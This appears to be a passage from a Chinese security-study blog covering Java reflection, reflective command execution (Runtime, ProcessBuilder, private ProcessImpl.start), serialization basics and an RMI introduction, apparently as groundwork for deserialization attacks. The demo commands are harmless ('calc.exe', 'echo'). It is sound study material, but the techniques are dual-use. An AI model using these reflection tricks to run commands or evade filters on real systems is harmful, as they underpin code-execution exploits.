<h4 id="示例代码-8"><a href="#示例代码-8" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.DEMO.reflectdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstructorDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; clazz =  Class.forName(<span class="string">&quot;org.example.DEMO.reflectdemo.UserInfo&quot;</span>);</span><br><span class="line"><span class="comment">// 获取一个声明为 public 构造函数实例</span></span><br><span class="line">        Constructor&lt;?&gt; constructor1 = clazz.getConstructor(String.class,<span class="keyword">int</span>.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;1-getConstructor运行结果：&quot;</span> + constructor1);</span><br><span class="line"><span class="comment">// 根据构造函数创建一个实例</span></span><br><span class="line">        Object c1 = constructor1.newInstance(<span class="string">&quot;power7089&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;2-newInstance运行结果： &quot;</span> + c1);</span><br><span class="line"><span class="comment">// 获取所有声明为 public 构造函数实例</span></span><br><span class="line">        Constructor&lt;?&gt;[] constructorArray1 = clazz.getConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor&lt;?&gt; constructor : constructorArray1) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;3-getConstructors运行结果：&quot;</span> + constructor);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 获取一个声明的构造函数实例</span></span><br><span class="line">        Constructor&lt;?&gt; constructor2 = clazz.getDeclaredConstructor(String.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;4-getDeclaredConstructor运行结果：&quot;</span> + constructor2);</span><br><span class="line"><span class="comment">// 将构造函数的可访问标志设为 true 后，可以通过私有构造函数创建实例</span></span><br><span class="line">        constructor2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o2 = constructor2.newInstance(<span class="string">&quot;Power7089666&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;5-newInstance运行结果：&quot;</span> + o2);</span><br><span class="line"><span class="comment">// 获取所有声明的构造函数实例</span></span><br><span class="line">        Constructor&lt;?&gt;[] constructorArray2 = clazz.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor&lt;?&gt; constructor : constructorArray2) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;6-getDeclaredConstructors运行结果：&quot;</span> + constructor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20230816110546268.png" alt="image-20230816110546268"></p>
<h3 id="java-lang-reflect-AccessibleObject"><a href="#java-lang-reflect-AccessibleObject" class="headerlink" title="java.lang.reflect.AccessibleObject"></a>java.lang.reflect.AccessibleObject</h3><p>是 Field 、 Method 和 Constructor 类的类。该类提供了对类、方法、构造函数的访问控制检查的能力（如：私有方法只允许当前类访问）。</p>
<p>该访问检查在设置/获取属性、调用方法、创建/初始化类的实例时执行。</p>
<h4 id="示例代码-9"><a href="#示例代码-9" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可以看 ConstructorDemo 类代码，涉及到了 setAccessible() ，如下：</span></span><br><span class="line"><span class="comment">// 获取一个声明的构造函数实例</span></span><br><span class="line">Constructor&lt;?&gt; constructor2 = clazz.getDeclaredConstructor(String.class);</span><br><span class="line">System.out.println(<span class="string">&quot;4-getDeclaredConstructor运行结果：&quot;</span> + constructor2);</span><br><span class="line"><span class="comment">// 将构造函数的可访问标志设为 true 后，可以通过私有构造函数创建实例</span></span><br><span class="line">constructor2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object o2 = constructor2.newInstance(<span class="string">&quot;Power7089666&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;5-newInstance运行结果：&quot;</span> + o2);</span><br></pre></td></tr></table></figure>



<h2 id="java反射到命令执行"><a href="#java反射到命令执行" class="headerlink" title="java反射到命令执行"></a>java反射到命令执行</h2><h3 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h3><p>普通的通过runtime执行命令的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process process = Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>



<h4 id="getmethod"><a href="#getmethod" class="headerlink" title="getmethod"></a>getmethod</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method getRuntimeMethod = clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Object runtime = getRuntimeMethod.invoke(clazz);</span><br><span class="line"></span><br><span class="line">Method execMethod = clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>



<p>代码解读</p>
<p>首先通过forName获取到java.lang.Runtime<br>然后获取getRuntime方法，使用invoke执行该方法，获取到runtime（ Runtime.getRuntime() ）。<br>然后通过getMethod获取到exec方法，后面的String.class是使用6个exec调用方式(重载)中的最简单的一个方法<img src="image-20230816113226144.png" alt="image-20230816113226144"><br>最后在通过invoke方法调用runtime对象执行命令（   Runtime.getRuntime().exec(“calc.exe”)   ）。</p>
<p>简化后代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><del>(个人理解)，invoke执行代码前，可以将invoke函数内的参数和原函数的参数对比</del></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getRuntime()</span><br><span class="line">getRuntimeMethod.invoke(clazz);</span><br><span class="line"><span class="comment">// 这里可以看到，多了一个clazz，clazz是getRuntime()前面的Runtime</span></span><br><span class="line"></span><br><span class="line">exec(<span class="string">&quot;calc.exe&quot;</span>)</span><br><span class="line">execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以看到多了一个runtime，而runtime是exec前的 Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">// 有点像python的类里面，都会加一个self</span></span><br></pre></td></tr></table></figure>



<h4 id="getDeclaredConstructor"><a href="#getDeclaredConstructor" class="headerlink" title="getDeclaredConstructor"></a>getDeclaredConstructor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Method c1 = clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">c1.invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>简单解读：<br>首先通过Class.forName获取java.lang.Runtime。<br>接下来通过getDeclaredConstructor获取构造函数。<br>通过 setAccessible(true) 设置改变作用域，让我们可以调用他的私有构造函数。<br>调用exec方法，入参设置为 String.class 。<br>最后使用Invoke执行方法。</p>
<h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><p>普通的通过ProcessBuilder执行命令的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder();</span><br><span class="line">processBuilder.command(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,command);</span><br><span class="line">Process process = processBuilder.start();</span><br></pre></td></tr></table></figure>

<p>通过反射借助ProcessBuilder执行代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">Object object = clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo 6&quot;</span>));</span><br><span class="line">process = (Process) clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(object,<span class="keyword">null</span>);</span><br><span class="line">result(process);</span><br><span class="line"></span><br><span class="line">clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">process = (Process) ((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo 7&quot;</span>))).start();</span><br><span class="line">result(process);</span><br><span class="line"></span><br><span class="line">clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">process = (Process) clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo 8&quot;</span>)));</span><br><span class="line">result(process);</span><br></pre></td></tr></table></figure>



<h3 id="ProcessImpl"><a href="#ProcessImpl" class="headerlink" title="ProcessImpl"></a>ProcessImpl</h3><p>通过ProcessImpl执行命令的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">clazz = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">String[] cmds = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo homework&quot;</span>&#125;;</span><br><span class="line">Method method = clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class,</span><br><span class="line">        Map.class, String.class, ProcessBuilder.Redirect[].class,</span><br><span class="line">        <span class="keyword">boolean</span>.class);</span><br><span class="line">method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">process = (Process) method.invoke(<span class="keyword">null</span>, cmds, <span class="keyword">null</span>, <span class="string">&quot;.&quot;</span>, <span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line">result(process);</span><br></pre></td></tr></table></figure>

<p>首先通过forName获取到java.lang.ProcessImpl</p>
<p>通过getDeclaredMethod构造函数start,start函数的参数分别为String, Map, String, ProcessBuilder, Redirect[], boolean</p>
<p>构造好之后，将构造函数的可访问标志设为 true 后，可以通过私有构造函数创建实例。或者说改变作用域，让我们可以调用他的私有构造函数。</p>
<p>最后调用构造好的函数执行cmds的命令</p>
<h3 id="最后的完整代码"><a href="#最后的完整代码" class="headerlink" title="最后的完整代码"></a>最后的完整代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.DEMO.codeexec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, InstantiationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 普通Runtime</span></span><br><span class="line">        Process process = Runtime.getRuntime().exec(<span class="string">&quot;echo 1&quot;</span>);</span><br><span class="line">        result(process);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射 getMethod</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Method getRuntimeMethod = clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        Object runtime = getRuntimeMethod.invoke(clazz);</span><br><span class="line"></span><br><span class="line">        Method execMethod = clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        process = (Process) execMethod.invoke(runtime, <span class="string">&quot;echo 2&quot;</span>);</span><br><span class="line">        result(process);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 简化后的反射 getMethod</span></span><br><span class="line">        clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        process = (Process) clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;echo 3&quot;</span>);</span><br><span class="line">        result(process);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// getDeclaredConstructor执行代码</span></span><br><span class="line">        clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line">        m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Method c1 = clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        process = (Process) c1.invoke(m.newInstance(), <span class="string">&quot;echo 4&quot;</span>);</span><br><span class="line">        result(process);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 普通ProcessBuilder执行代码</span></span><br><span class="line">        ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder();</span><br><span class="line">        processBuilder.command(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo 5&quot;</span>);</span><br><span class="line">        process = processBuilder.start();</span><br><span class="line">        result(process);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ProcessBuilder通过反射执行代码</span></span><br><span class="line">        clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        Object object = clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo 6&quot;</span>));</span><br><span class="line">        process = (Process) clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(object,<span class="keyword">null</span>);</span><br><span class="line">        result(process);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        process = (Process) ((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo 7&quot;</span>))).start();</span><br><span class="line">        result(process);</span><br><span class="line"></span><br><span class="line">        clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        process = (Process) clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo 8&quot;</span>)));</span><br><span class="line">        result(process);</span><br><span class="line"></span><br><span class="line">        clazz = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        String[] cmds = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo homework&quot;</span>&#125;;</span><br><span class="line">        Method method = clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class,</span><br><span class="line">                Map.class, String.class, ProcessBuilder.Redirect[].class,</span><br><span class="line">                <span class="keyword">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        process = (Process) method.invoke(<span class="keyword">null</span>, cmds, <span class="keyword">null</span>, <span class="string">&quot;.&quot;</span>, <span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line">        result(process);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">result</span><span class="params">(Process p)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String line;</span><br><span class="line">        BufferedReader bf = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8));</span><br><span class="line">        <span class="keyword">while</span> ((line = bf.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//逐行读取</span></span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        bf.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="java序列化和反序列化"><a href="#java序列化和反序列化" class="headerlink" title="java序列化和反序列化"></a>java序列化和反序列化</h1><p>借一下别人的图</p>
<p><img src="image-20230816163025066.png" alt="image-20230816163025066"></p>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化是指把 Java 对象转换为字节序列的过程，目的是便于保存在内存、文件、数据库中。<br>ObjectOutputStream 类的 writeObject() 方法可以实现序列化。<br>writeObject()方法：将指定的对象写入ObjectOutputStream中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(Object obj)</span><span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure>

<p>官方文档详细说明：<a class="link" target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/api/java/io/ObjectOutputStream.html#writeObject-java.lang.Object-">https://docs.oracle.com/javase/8/docs/api/java/io/ObjectOutputStream.html#writeObject-java.lang.Object-<i class="fas fa-external-link-alt"></i></a><br>一个类的对象要想序列化成功，必须满足两个条件：</p>
<ul>
<li>该类必须实现 java.io.Serializable 接口。</li>
<li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</li>
</ul>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>反序列化是指把字节序列恢复为 Java 对象的过程。<br>ObjectInputStream 类的 readObject() 方法可实现反序列化。<br>readObject()方法：从ObjectInputStream读取一个对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">readObject</span><span class="params">()</span><span class="keyword">throws</span> IOException,ClassNotFoundException</span></span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        HackInfo hack = <span class="keyword">new</span> HackInfo();</span><br><span class="line">        hack.id = <span class="string">&quot;Power7089&quot;</span>;</span><br><span class="line">        hack.team = <span class="string">&quot;闪石星曜CyberSecurity&quot;</span>;</span><br><span class="line"><span class="comment">//将序列化后的字节序列写到serializedata.txt文件中</span></span><br><span class="line">        FileOutputStream fileOut = <span class="keyword">new</span></span><br><span class="line">                FileOutputStream(<span class="string">&quot;/tmp/test/serializedata.txt&quot;</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fileOut);</span><br><span class="line">        out.writeObject(hack);</span><br><span class="line">        out.close();</span><br><span class="line">        fileOut.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化的数据已经保存在了serializedata.txt文件 中&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HackInfo hackdes = <span class="keyword">null</span>;</span><br><span class="line">        FileInputStream fileIn = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;/tmp/test/serializedata.txt&quot;</span>);</span><br><span class="line">        ObjectInputStream ObjIn = <span class="keyword">new</span> ObjectInputStream(fileIn);</span><br><span class="line">        hackdes = (HackInfo) ObjIn.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;id = &quot;</span>+ hackdes.id);</span><br><span class="line">        System.out.println(<span class="string">&quot;team = &quot;</span>+ hackdes.team);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20230816165815476.png" alt="image-20230816165815476"></p>
<p><strong>序列化的数据会有明显的特征，都是以 aced 0005 7372 开头的。</strong></p>
<p><img src="image-20230816165410543.png" alt="image-20230816165410543"></p>
<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><p>RMI（Remote Method Invocation，远程方法调用）是Java的一组拥护开发分布式应用程序的API。RMI使用Java语言接口定义了远程对象，它集合了Java序列化和Java远程方法协议(Java Remote Method Protocol)。<br>简单地说，原先的程序仅能在同一操作系统的方法调用，通过RMI可以变成在不同操作系统之间对程序中方法的调用。<br>RMI依赖的通信协议是JRMP。JRMP： Java远程方法协议（Java Remote MethodProtocol，JRMP ），是特定于Java技术的、用于查找和引用远程对象的协议。<br><strong>RMI对象是通过序列化方式进行传输的</strong>。序列化是RMI的前置科技树。</p>
<h2 id="RMI中的三个角色"><a href="#RMI中的三个角色" class="headerlink" title="RMI中的三个角色"></a>RMI中的三个角色</h2><p>RMI中涉及到三个角色，它们分别为服务端（Server），注册中心（Registry）和客户端（Client），下面是他们的作用。</p>
<ul>
<li><p>服务端（Server）：负责将远程对象绑定至注册中心。</p>
</li>
<li><p>注册中心（Registry）：服务端会将远程对象绑定至此。客户端会向注册中心查询绑定的远程对象。</p>
</li>
<li><p>客户端（Client）：与注册中心和服务端交互。</p>
</li>
</ul>
<p>插入一张来自互联网的图片，直观展示了他们的关系</p>
<p><img src="image-20230816170245696.png" alt="image-20230816170245696"></p>
<ul>
<li><p>存根/桩(Stub)：客户端侧的代理，每个远程对象都包含一个代理对象stub，当运行在本地Java虚拟机上的程序调用运行在远程Java虚拟机上的对象方法时，它首先在本地创建该对象的代理对象stub, 然后调用代理对象上匹配的方法。</p>
</li>
<li><p>骨架(Skeleton)：服务端侧的代理，用于读取stub传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。</p>
</li>
<li><p>⚠注意：在<strong>低版本</strong>的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功。比如<strong>Jdk8u121</strong>这个分界线。</p>
</li>
</ul>
<p>(这块没懂RMI三角色的工作原理)</p>
<h2 id="RMI代码编写步骤"><a href="#RMI代码编写步骤" class="headerlink" title="RMI代码编写步骤"></a>RMI代码编写步骤</h2><ol>
<li><p>创建远程接口及声明远程方法（SayHello.java）</p>
